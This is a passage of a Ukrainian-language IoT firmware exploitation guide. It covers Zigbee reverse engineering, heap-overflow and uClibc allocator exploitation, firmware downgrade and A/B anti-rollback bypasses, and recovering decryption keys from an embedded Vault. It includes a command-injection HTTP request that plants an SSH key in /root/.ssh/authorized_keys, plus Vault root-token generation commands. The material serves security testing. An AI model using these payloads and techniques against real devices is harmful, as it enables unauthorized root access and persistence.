```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Відображення повідомлень Zigbee / радіоспівпроцесора

У IoT-хабах RF-стек часто розділений між **радіо-MCU** та процесом userland у Linux. Корисний робочий процес — відобразити шлях:<sup>[[8]](#references)</sup>

1. **RF-кадр** в ефірі
2. **Парсер на боці контролера** на радіо-MCU
3. **Текстовий або TLV-протокол через serial/UART**, що пересилається до Linux (наприклад, `/dev/tty*`)
4. **Диспетчер застосунку** в головному daemon
5. **Обробник, специфічний для протоколу / машина станів**

Така архітектура створює дві цілі для reverse engineering замість однієї. Якщо контролер перетворює бінарні радіокадри на текстовий протокол, наприклад `Group,Command,arg1,arg2,...`, відновіть:

- **Групи повідомлень** і таблиці диспетчеризації
- Які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- Точні **поля-розрізнювачі, специфічні для виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- Які обробники доступні лише під час **сполучення**, виявлення або завантаження прошивки/моделі

Для Zigbee перехопіть трафік сполучення та перевірте, чи ціль усе ще використовує типовий **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку під час налаштування може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тому перевірте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколу, специфічні для виробника, та доступність, обмежена FSM

Команди Zigbee/ZCL, специфічні для виробника, часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони передають дані до **власного коду парсингу** та внутрішніх **FSM**, валідація яких перевірена менш ретельно.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Виконуйте reverse engineering диспетчера команд, доки не знайдете **обробник лише для команд виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, які автоматично просуваються далі, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольовані атакувальником дані.
- З’ясуйте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, а не припускайте, що вразливий обробник завжди доступний.

Для протоколів, чутливих до часу, повторне відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) зі стеком рівня виробника, щоб забезпечити правильні **кінцеві точки**, **атрибути** й час налаштування.

### Клас помилок фрагментованого завантаження в embedded-daemon

У прошивках часто трапляється клас помилок у **фрагментованих завантаженнях blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише контрольовані атакувальником поля поточного пакета, як-от `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки щодо **початкового розміру виділеного буфера**.

Це дає змогу атакувальнику надіслати:

- Перший коректний фрагмент із **малим** оголошеним загальним розміром, щоб змусити систему виділити невеликий буфер у heap.
- Пізніший фрагмент із **очікуваним зсувом**, але більшим `chunk_len`.
- Підроблений розмір поточного пакета, який проходить нові перевірки, але все одно спричиняє переповнення початково виділеного буфера.

Якщо вразливий шлях захищений логікою налаштування, для експлуатації потрібна достатня **емуляція пристрою**, щоб перевести ціль у стан завантаження моделі або blob перед надсиланням некоректних фрагментів.

### Виклик `free()` через протокол

В embedded-daemon найпростіший спосіб викликати експлуатацію метаданих heap — часто не «чекати на очищення», а **змусити протокол обробити помилку**:<sup>[[8]](#references)</sup>

- Надішліть некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте цей передбачуваний виклик `free()`, щоб задіяти примітиви allocator до аварійного завершення процесу з інших причин.

Це особливо корисно проти allocator на кшталт **musl/uClibc/dlmalloc** в embedded Linux, де пошкодження метаданих chunk може перетворити логіку unlink/unbin на примітив запису. Стабільний підхід — пошкодити **поле розміру**, щоб спрямувати обхід allocator до **підроблених chunk, розміщених усередині переповненого буфера**, замість негайного перезапису вказівників реальних bin і аварійного завершення процесу.

## Бінарна експлуатація та proof-of-concept

Розробка PoC для виявлених вразливостей потребує глибокого розуміння архітектури цілі та програмування мовами низького рівня. Захисти під час виконання бінарних файлів в embedded-системах трапляються рідко, але за їх наявності можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins і консолідація:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може викликати `__malloc_consolidate()`, тому підроблений chunk має пройти перевірки (коректний розмір, `fd = 0`, а сусідні chunk мають сприйматися як «зайняті»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE за ввімкненого ASLR:** якщо ASLR увімкнено, але головний бінарний файл **не використовує PIE**, адреси `.data/.bss` усередині бінарного файлу стабільні. Можна вибрати область, яка вже нагадує коректний заголовок heap chunk, щоб спрямувати виділення fastbin на **таблицю вказівників на функції**.
- **NUL, що зупиняє парсер:** під час парсингу JSON символ `\x00` у payload може зупинити парсинг, зберігши подальші контрольовані атакувальником байти для pivot стека/ROP-ланцюжка.
- **Shellcode через `/proc/self/mem`:** ROP-ланцюжок, який викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому відображенні пам’яті та передати на нього керування.

## Атаки зі зниженням версії прошивки та незахищені механізми оновлення

Навіть якщо виробник перевіряє криптографічні підписи образів прошивки, **захист від відкату версії (downgrade) часто відсутній**. Якщо завантажувач або завантажувач відновлення лише перевіряє підпис за вбудованим відкритим ключем, але не порівнює *версію* (або монотонний лічильник) образу, що прошивається, атакувальник може легітимно встановити **старішу вразливу прошивку з чинним підписом** і повторно активувати виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий сценарій атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з відкритого порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його з супровідних мобільних/десктопних застосунків (наприклад, із `assets/firmware/` в Android APK).
   * Знайдіть його у сторонніх репозиторіях, як-от VirusTotal, Internet Archive, на форумах тощо.
2. **Завантажте образ на пристрій або надайте його пристрою** через доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* HTTP(S)-кінцеві точки, які приймають Base64-кодовані blob прошивки, декодують їх на сервері та запускають відновлення/оновлення.
3. Після відкату скористайтеся вразливістю, яку виправили в новішому випуску (наприклад, фільтром від command injection, доданим пізніше).
4. За бажанням прошийте останній образ назад або вимкніть оновлення, щоб уникнути виявлення після отримання persistence.

### Приклад: Command Injection після відкату версії

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (зі зниженою версією) прошивці параметр `md5` безпосередньо конкатенується в команду оболонки без санітизації, що дає змогу виконувати довільні команди (тут — увімкнути root-доступ за допомогою SSH-ключа). У пізніших версіях прошивки додали базовий фільтр символів, але відсутність захисту від downgrade робить це виправлення марним.<sup>[[4]](#references)</sup>

### Вилучення прошивки з мобільних застосунків

Багато виробників додають повні образи прошивки до своїх мобільних застосунків-компаньйонів, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Ці пакунки зазвичай зберігаються в APK/APEX без шифрування, у шляхах на кшталт `assets/fw/` або `res/raw/`. Такі інструменти, як `apktool`, `ghidra` або навіть звичайний `unzip`, дають змогу витягнути підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід anti-rollback лише на рівні updater у схемах зі слотами A/B

Деякі виробники реалізують **ratchet** для захисту від downgrade, але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді recovery або OTA-агенті userspace). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє таблиці розділів або метаданим слотів, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка реалізація:

- Метадані firmware містять і дескриптор версії, і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням у постійному сховищі й відхиляє старіші підписані образи.
- **Bootloader** не аналізує цей ratchet і перед завантаженням вибраного слота перевіряє лише заголовок, CRC та підпис.
- Активація слота зберігається окремо — у таблиці розділів або лічильнику покоління для кожного слота — і **криптографічно не прив’язана** до точного digest перевіреної firmware.

У системах із двома слотами це створює примітив **«перевірити один образ / завантажити інший»**. Якщо зловмисник може змусити updater позначити слот B як ціль наступного завантаження за допомогою поточного підписаного образу, а потім перезаписати слот B до перезавантаження, bootloader усе одно може завантажити старішу firmware, оскільки довіряє лише вже зафіксованим метаданим слота.

Типовий сценарій зловживання:

1. Завантажити **поточну підписану** firmware у неактивний слот і виконати звичайну процедуру перевірки/перемикання, щоб розмітка позначила цей слот як наступний активний.
2. **Поки що не перезавантажуватися**. У тій самій сесії повторно викликати процедуру підготовки/стирання слота.
3. Зловживати застарілим станом завантаження або логікою вибору слота, щоб updater стер **той самий фізичний слот**, який щойно було призначено активним.
4. Записати в цей слот **старішу, але все ще підписану** firmware.
5. Пропустити процедуру перевірки, яка застосовує ratchet, і одразу перезавантажити пристрій.
6. Bootloader вибирає призначений активним слот, перевіряє лише підпис/цілісність і завантажує старий образ.

На що звертати увагу під час аналізу реалізацій оновлення A/B:

- Вибір слота на основі **прапорців часу завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()`, яка стирає слот на основі застарілого стану, а не **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()`, яка лише збільшує **лічильник покоління** / оновлює прапорець активного слота, але не зберігає хеш перевіреного образу.
- Перевірки ratchet, реалізовані в userspace або коді updater, але **не** на етапах ROM / bootloader / secure boot.
- Процедури стирання або recovery, які залишають слот позначеним як придатний до завантаження, навіть після видалення та повторного запису його вмісту.

### Контрольний список для оцінювання логіки оновлення

* Чи належно захищені транспорт і автентифікація *endpoint оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник захисту від rollback** перед прошиванням?
* Чи перевіряється образ у межах ланцюжка secure boot (наприклад, чи перевіряє підписи код ROM)?
* Чи застосовує **bootloader той самий ratchet**, що й updater, замість того, щоб перевіряти лише підпис/CRC?
* Чи прив’язані метадані активації слота **до digest/версії перевіреної firmware**, чи слот можна змінити після призначення активним?
* Після успішного перемикання слота пристрій примусово перезавантажується, чи в тій самій сесії все ще доступні процедури оновлення/стирання?
* Чи виконує userland додаткові перевірки коректності (наприклад, допустима карта розділів, номер моделі)?
* Чи використовують *часткові* або *резервні* сценарії оновлення ту саму логіку перевірки?

> 💡  Якщо чогось із переліченого бракує, платформа, ймовірно, вразлива до атак rollback.

## Відновлення ключів розшифрування firmware зі стану вбудованого KMS/Vault

Якщо образ оновлення містить невеликі метадані у відкритому вигляді та великий блок із високою ентропією, перш ніж щось підбирати перебором, проаналізуйте контейнер:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зміщення та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це salt, а решта байтів — шифротекст.
- Поле Base64, яке декодується рівно у `256` байтів, — вагома ознака того, що перед вами шифротекст RSA-2048, який містить випадковий пароль firmware або ключ сеансу.
- Відокремлений матеріал PGP у тому самому файлі часто забезпечує лише автентичність; не вважайте його механізмом конфіденційності.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) не дав результату, проаналізуйте **операційний шлях розшифрування**, а не лише шукайте приватні ключі:

- Декомпілюйте updater / бінарний файл керування й простежте, хто читає зашифрований блок, який helper/API його розшифровує та яке логічне ім’я ключа він запитує.
- Шукайте стан KMS у витягнутій кореневій файловій системі (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також файли unit і скрипти init.
- Вважайте команди `vault operator unseal ...` у відкритому вигляді, ключі відновлення, bootstrap-токени або локальні скрипти автоматичного unseal KMS еквівалентом матеріалу приватного ключа.

Якщо пристрій постачається з оригінальним бінарним файлом Vault і backend сховища, відтворити це середовище зазвичай простіше, ніж реалізовувати внутрішню логіку Vault заново:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Маючи root на клонованому KMS:

- Зробіть transit keys експортованими лише всередині ізольованого клону: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ unwrap: `vault read transit/export/encryption-key/<name>`
- Спробуйте використати відновлений RSA-ключ із точним поєднанням padding/hash, яке використовує KMS. Невдала розшифровка PKCS#1 v1.5 і невдала розшифровка OAEP за замовчуванням **не** доводять, що ключ неправильний: у багатьох потоках на базі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL постачальника (`EVP_BytesToKey`, часто MD5 на застарілих пристроях), перш ніж пробувати розшифрувати AES-CBC.

Так проблема «зашифрованої прошивки» стає загальнішою: **відновіть операційні ключі на боці пристрою, а потім точно відтворіть параметри unwrap + KDF офлайн**.
